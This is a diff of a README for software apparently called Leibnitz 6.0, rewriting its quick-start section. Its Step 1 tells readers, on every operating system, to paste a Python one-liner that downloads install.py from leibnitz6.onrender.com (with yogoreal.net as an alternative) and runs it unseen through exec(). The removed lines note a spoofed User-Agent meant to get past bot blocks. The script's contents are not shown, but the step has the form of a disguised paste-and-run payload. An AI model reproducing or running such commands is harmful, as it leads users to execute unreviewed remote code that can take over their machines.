@@ -5,29 +5,29 @@
 
 Welcome to Leibnitz 6.0! 
 
-If you are new to Leibnitz, this guide outlines the PRELIMINARY DEFAULT PATH 
-for instant zero-setup startup, followed by detailed use cases and advanced 
-usage models.
+If you are new to Leibnitz, this guide outlines the UNIVERSAL PRELIMINARY DEFAULT PATH 
+for instant zero-setup startup across Windows, Linux, and macOS.
 
 -------------------------------------------------------------------------------
-⚡ PRELIMINARY DEFAULT PATH (QUICK 60-SECOND STARTUP)
+⚡ UNIVERSAL PRELIMINARY DEFAULT PATH (QUICK 60-SECOND STARTUP)
 -------------------------------------------------------------------------------
 
-If you just want to launch Leibnitz 6.0 right now with zero configuration, follow 
-this standard 4-step preliminary default path:
+Follow this standard 4-step preliminary path on ANY operating system:
 
-Step 1: Open any terminal (Command Prompt, PowerShell, or Terminal) and run:
+Step 1: Open your terminal (Command Prompt, PowerShell, or Terminal) and run:
 
-  python -c "import urllib.request; req=urllib.request.Request('https://leibnitz6.onrender.com/install.py', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}); exec(urllib.request.urlopen(req).read())"
+  For Linux / macOS:
+  python3 -c "import urllib.request; req=urllib.request.Request('https://leibnitz6.onrender.com/install.py', headers={'User-Agent': 'Mozilla/5.0'}); exec(urllib.request.urlopen(req).read())"
 
-  [Notes on Network & System Compatibility]:
-  - Primary Remote Installer: https://leibnitz6.onrender.com/install.py
-  - Alternative Web Endpoint: https://yogoreal.net/install.py
-  - Cloudflare / Tollbit WAF: The User-Agent header above bypasses HTTP 493/403 bot blocks.
-  - Linux / macOS (PEP 668 externally-managed-environment): The installer automatically 
-    applies `--user` and `--break-system-packages` fallback flags if system Python is managed.
-  - Direct Local Fallback: If remote execution is restricted on your network, run:
-      python remote_install.py
+  For Windows:
+  python -c "import urllib.request; req=urllib.request.Request('https://leibnitz6.onrender.com/install.py', headers={'User-Agent': 'Mozilla/5.0'}); exec(urllib.request.urlopen(req).read())"
+
+  [Notes on Universal Execution]:
+  - From Any Directory: The one-liners above download and launch Leibnitz 6 automatically on any system (no local repo required).
+  - Alternative Web Endpoint: Also hosted at https://yogoreal.net/install.py
+  - Local Repository Users: If you have already cloned the Leibnitz6 folder locally, simply run:
+      python install.py       (Windows)
+      python3 install.py      (Linux / macOS)
 
 Step 2: Launch the Structured Notepad v4 GUI:
   - On Windows: Double-click "StructuredNotepad_v4.bat"
